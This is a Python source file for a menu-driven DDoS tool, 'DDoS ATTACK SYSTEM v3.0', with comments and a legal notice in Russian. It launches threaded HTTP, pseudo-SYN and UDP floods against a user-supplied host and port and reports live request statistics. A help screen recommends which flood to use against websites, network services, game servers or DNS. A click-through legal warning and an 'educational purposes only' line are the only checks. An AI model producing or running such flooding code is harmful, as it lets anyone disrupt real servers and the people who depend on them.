import os
import time
import random
import threading
import socket
import sys
from datetime import datetime

class DDoSAttackSystem:
    def __init__(self):
        self.attack_active = False
        self.threads = []
        self.stats = {
            'requests_sent': 0,
            'successful_connections': 0,
            'failed_connections': 0,
            'start_time': None,
            'target_url': None
        }
        self.session_id = f"DDoS_{random.randint(1000, 9999)}"
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = f"""
================================================================================
|                                                                              |
|  ██████╗ ██████╗  ██████╗ ███████╗     █████╗ ████████╗████████╗ █████╗     |
|  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗    |
|  ██║  ██║██║  ██║██║   ██║███████╗    ███████║   ██║      ██║   ███████║    |
|  ██║  ██║██║  ██║██║   ██║╚════██║    ██╔══██║   ██║      ██║   ██╔══██║    |
|  ██████╔╝██████╔╝╚██████╔╝███████║    ██║  ██║   ██║      ██║   ██║  ██║    |
|  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝    |
|                                                                              |
|                         DDoS ATTACK SYSTEM v3.0                             |
|                           DEVELOPED BY MRLADER                              |
|                         SESSION: {self.session_id}                          |
|                                                                              |
================================================================================
"""
        print(banner)
    
    def type_effect(self, text, delay=0.03):
        for char in text:
            print(char, end='', flush=True)
            time.sleep(delay)
        print()
    
    def loading_animation(self, text, duration=3):
        print(f"{text} ", end="", flush=True)
        start_time = time.time()
        while time.time() - start_time < duration:
            for char in '|/-\\':
                print(f'\b{char}', end='', flush=True)
                time.sleep(0.1)
        print('\b ', end='', flush=True)
        print()
    
    def get_ip_from_url(self, url):
        """Извлекает домен из URL"""
        if 'http://' in url:
            url = url.replace('http://', '')
        elif 'https://' in url:
            url = url.replace('https://', '')
        
        if '/' in url:
            url = url.split('/')[0]
        
        return url
    
    def send_http_flood(self, target, port=80, thread_id=0):
        """Отправляет HTTP запросы на целевой сервер"""
        try:
            # Создаем сокет
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            # Подключаемся к серверу
            sock.connect((target, port))
            
            # Отправляем HTTP запрос
            http_request = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: */*\r\n\r\n"
            sock.send(http_request.encode())
            
            self.stats['successful_connections'] += 1
            sock.close()
            
        except Exception as e:
            self.stats['failed_connections'] += 1
        
        self.stats['requests_sent'] += 1
    
    def send_syn_flood(self, target, port=80, thread_id=0):
        """Отправляет SYN пакеты (полуоткрытые соединения)"""
        try:
            # Создаем raw socket (требует прав администратора)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
            # Здесь должна быть сложная логика создания TCP пакетов
            # Для простоты используем обычные соединения
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            sock.close()
            
            self.stats['successful_connections'] += 1
            
        except:
            self.stats['failed_connections'] += 1
        
        self.stats['requests_sent'] += 1
    
    def send_udp_flood(self, target, port=80, thread_id=0):
        """Отправляет UDP пакеты"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Отправляем случайные данные
            data = random._urandom(1024)  # 1KB случайных данных
            sock.sendto(data, (target, port))
            
            self.stats['successful_connections'] += 1
            sock.close()
            
        except:
            self.stats['failed_connections'] += 1
        
        self.stats['requests_sent'] += 1
    
    def attack_worker(self, target, port, attack_type, thread_id, packets_per_second):
        """Рабочий поток для атаки"""
        while self.attack_active:
            try:
                if attack_type == "HTTP_FLOOD":
                    self.send_http_flood(target, port, thread_id)
                elif attack_type == "SYN_FLOOD":
                    self.send_syn_flood(target, port, thread_id)
                elif attack_type == "UDP_FLOOD":
                    self.send_udp_flood(target, port, thread_id)
                
                # Контроль скорости атаки
                time.sleep(1.0 / packets_per_second)
                
            except Exception as e:
                continue
    
    def start_ddos_attack(self):
        self.clear_screen()
        print("=" * 80)
        print("DDoS ATTACK MODULE")
        print("=" * 80)
        print()
        
        # Ввод параметров атаки
        target_url = input("[INPUT] Enter target URL or IP: ")
        port = int(input("[INPUT] Enter target port (default 80): ") or "80")
        threads_count = int(input("[INPUT] Number of threads (default 50): ") or "50")
        attack_type = input("[INPUT] Attack type (HTTP/SYN/UDP, default HTTP): ").upper() or "HTTP"
        duration = int(input("[INPUT] Attack duration in seconds (0 for unlimited): ") or "0")
        
        # Преобразуем тип атаки
        if attack_type == "HTTP":
            attack_type = "HTTP_FLOOD"
        elif attack_type == "SYN":
            attack_type = "SYN_FLOOD"
        elif attack_type == "UDP":
            attack_type = "UDP_FLOOD"
        else:
            attack_type = "HTTP_FLOOD"
        
        target_ip = self.get_ip_from_url(target_url)
        
        print(f"\n[INFO] Target: {target_ip}:{port}")
        print(f"[INFO] Attack type: {attack_type}")
        print(f"[INFO] Threads: {threads_count}")
        print(f"[INFO] Duration: {'Unlimited' if duration == 0 else f'{duration} seconds'}")
        
        # Подтверждение атаки
        confirm = input("\n[CONFIRM] Start attack? (y/n): ").lower()
        if confirm != 'y':
            print("[INFO] Attack cancelled")
            return
        
        # Инициализация статистики
        self.stats = {
            'requests_sent': 0,
            'successful_connections': 0,
            'failed_connections': 0,
            'start_time': datetime.now(),
            'target_url': target_ip
        }
        
        self.attack_active = True
        self.threads = []
        
        print(f"\n[ATTACK] Starting DDoS attack on {target_ip}:{port}")
        print("[ATTACK] Press Ctrl+C to stop attack\n")
        
        # Запуск потоков атаки
        packets_per_second = 10  # Пакетов в секунду на поток
        
        for i in range(threads_count):
            thread = threading.Thread(
                target=self.attack_worker,
                args=(target_ip, port, attack_type, i, packets_per_second)
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Мониторинг атаки
        start_time = time.time()
        try:
            while self.attack_active:
                elapsed = time.time() - start_time
                
                if duration > 0 and elapsed >= duration:
                    print(f"\n[INFO] Attack duration reached. Stopping...")
                    break
                
                # Вывод статистики каждые 2 секунды
                self.display_attack_stats()
                time.sleep(2)
                
        except KeyboardInterrupt:
            print(f"\n[INFO] Attack interrupted by user")
        
        # Остановка атаки
        self.stop_attack()
        
        # Финальная статистика
        self.display_final_stats()
    
    def display_attack_stats(self):
        """Отображает текущую статистику атаки"""
        elapsed = time.time() - time.mktime(self.stats['start_time'].timetuple())
        rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
        
        print(f"\r[STATS] Time: {int(elapsed)}s | "
              f"Requests: {self.stats['requests_sent']} | "
              f"Success: {self.stats['successful_connections']} | "
              f"Failed: {self.stats['failed_connections']} | "
              f"RPS: {rps:.1f}", end="", flush=True)
    
    def display_final_stats(self):
        """Отображает финальную статистику после атаки"""
        elapsed = time.time() - time.mktime(self.stats['start_time'].timetuple())
        rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
        
        print(f"\n\n[FINAL STATISTICS]")
        print(f"Target: {self.stats['target_url']}")
        print(f"Duration: {int(elapsed)} seconds")
        print(f"Total requests sent: {self.stats['requests_sent']}")
        print(f"Successful connections: {self.stats['successful_connections']}")
        print(f"Failed connections: {self.stats['failed_connections']}")
        print(f"Average RPS: {rps:.1f}")
        print(f"Success rate: {(self.stats['successful_connections']/self.stats['requests_sent']*100 if self.stats['requests_sent'] > 0 else 0):.1f}%")
    
    def stop_attack(self):
        """Останавливает атаку"""
        self.attack_active = False
        time.sleep(1)  # Даем время потокам завершиться
    
    def show_attack_methods(self):
        """Показывает доступные методы атаки"""
        self.clear_screen()
        print("=" * 80)
        print("DDoS ATTACK METHODS")
        print("=" * 80)
        print()
        
        methods = """
HTTP FLOOD:
  - Отправляет множество HTTP запросов
  - Нагружает веб-сервер и приложение
  - Эффективно против веб-сайтов

SYN FLOOD:
  - Отправляет TCP SYN пакеты
  - Заполняет очередь соединений сервера
  - Эффективно против сетевой инфраструктуры

UDP FLOOD:
  - Отправляет UDP пакеты на случайные порты
  - Нагружает сетевой стек
  - Эффективно против игровых серверов, DNS

RECOMMENDATIONS:
  - Используйте HTTP FLOOD для веб-сайтов
  - Используйте SYN FLOOD для сетевых сервисов
  - Начинайте с 50 потоков и увеличивайте при необходимости
  - Мониторьте свою сетевую полосу пропускания
"""
        print(methods)
    
    def show_legal_warning(self):
        """Показывает предупреждение о законности"""
        self.clear_screen()
        print("=" * 80)
        print("LEGAL WARNING")
        print("=" * 80)
        print()
        
        warning = """
ВАЖНОЕ ПРЕДУПРЕЖДЕНИЕ:

1. DDoS атаки являются НЕЗАКОННЫМИ в большинстве стран
2. Несанкционированный доступ к компьютерным системам запрещен
3. Использование этого инструмента против чужих систем может привести к:
   - Уголовной ответственности
   - Крупным штрафам
   - Тюремному заключению

РАЗРЕШЕННОЕ ИСПОЛЬЗОВАНИЕ:
- Тестирование собственных серверов
- Образовательные цели в изолированной среде
- С разрешения владельца целевой системы

РАЗРАБОТЧИК НЕ НЕСЕТ ОТВЕТСТВЕННОСТИ ЗА НЕЗАКОННОЕ ИСПОЛЬЗОВАНИЕ.

Нажимая 'y' вы подтверждаете что:
- Используете инструмент только в законных целях
- Имеете разрешение на тестирование целевой системы
- Понимаете юридические последствия
"""
        print(warning)
        
        confirm = input("\nПодтверждаете законное использование? (y/n): ").lower()
        return confirm == 'y'
    
    def print_menu(self):
        menu = """
================================================================================
|                                MAIN MENU                                     |
================================================================================
| 1. Start DDoS Attack                                                         |
| 2. Show Attack Methods                                                       |
| 3. Legal Warning                                                             |
| 4. Exit                                                                      |
================================================================================
"""
        print(menu)
    
    def run(self):
        # Показываем предупреждение при первом запуске
        if not self.show_legal_warning():
            print("[EXIT] Legal warning not accepted. Exiting...")
            return
        
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            try:
                choice = input("[SELECT] Option (1-4): ")
                
                if choice == '1':
                    self.start_ddos_attack()
                elif choice == '2':
                    self.show_attack_methods()
                elif choice == '3':
                    self.show_legal_warning()
                elif choice == '4':
                    print("[EXIT] Closing DDoS Attack System...")
                    print("[INFO] Developed by MrLader - For educational purposes only")
                    break
                else:
                    print("[ERROR] Invalid option selected")
                
                if choice != '4':
                    input("\n[INPUT] Press Enter to continue...")
                    
            except KeyboardInterrupt:
                print("\n\n[EXIT] System terminated by user")
                if self.attack_active:
                    self.stop_attack()
                break

if __name__ == "__main__":
    try:
        # Проверяем права администратора (для raw socket)
        if os.name == 'nt':
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("[WARNING] Administrator rights recommended for SYN flood attacks")
        
        attacker = DDoSAttackSystem()
        attacker.run()
        
    except Exception as e:
        print(f"[ERROR] System failure: {e}")